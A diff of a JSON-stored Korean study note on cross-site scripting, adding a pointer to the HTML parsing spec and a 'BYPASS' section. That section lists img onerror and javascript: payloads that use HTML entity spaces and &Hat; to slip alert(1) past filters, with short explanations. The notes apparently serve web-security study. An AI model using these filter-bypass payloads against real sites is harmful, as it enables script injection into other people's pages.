@@ -12,12 +12,52 @@
   "status": "published",
   "trashedAt": null,
   "publishedAt": "2026-11-05T02:58:58.504Z",
-  "updatedAt": "2026-11-05T11:05:33.895Z",
-  "sourceDigest": "1836f85b0d4d9a55eb3c17e2e4c345328aa38ea4bd999c135330f36512285a79",
+  "updatedAt": "2026-11-05T11:32:04.551Z",
+  "sourceDigest": "48d75c5c27e8c2ba6b3d7402c5dc8d13c5d20877fc6444a1fdb84571d41cf99c",
   "assets": [],
   "doc": {
     "type": "doc",
     "content": [
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 1
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "XSS를 잘 하기 위해서는 HTML을 잘 알아야한다. "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://html.spec.whatwg.org/multipage/parsing.html",
+                  "target": "_blank",
+                  "rel": "noopener noreferrer",
+                  "class": null,
+                  "title": null
+                }
+              }
+            ],
+            "text": "https://html.spec.whatwg.org/multipage/parsing.html"
+          },
+          {
+            "type": "text",
+            "text": " 이 링크는 HTML 공식문서"
+          }
+        ]
+      },
       {
         "type": "paragraph",
         "content": [
@@ -127,6 +167,152 @@
               }
             ],
             "text": "https://shazzer.co.uk/"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 1
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "BYPASS"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 1
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "alert( "
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": null
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<img src=data: onerror=alert&puncsp;(1)>\n<img src=data: onerror=alert&hairsp;(1)>\n<img src=data: onerror=alert&emsp;(1)>\n<img src=data: onerror=alert&emsp13;(1)>\na href=\"javascript:1&Hat;alert(1)\">test</a>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "&puncsp;"
+          },
+          {
+            "type": "text",
+            "text": ", "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "&hairsp;"
+          },
+          {
+            "type": "text",
+            "text": ", "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "&emsp;"
+          },
+          {
+            "type": "text",
+            "text": ", "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "&emsp13;"
+          },
+          {
+            "type": "text",
+            "text": " → 각각 다른 유니코드 공백. 따라서 "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "alert 공백 (1)"
+          },
+          {
+            "type": "text",
+            "text": "로 해석되어 호출됩니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "&Hat;"
+          },
+          {
+            "type": "text",
+            "text": " → "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "^"
+          },
+          {
+            "type": "text",
+            "text": ". 마지막 링크는 "
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "code"
+              }
+            ],
+            "text": "javascript:1^alert(1)"
           }
         ]
       },
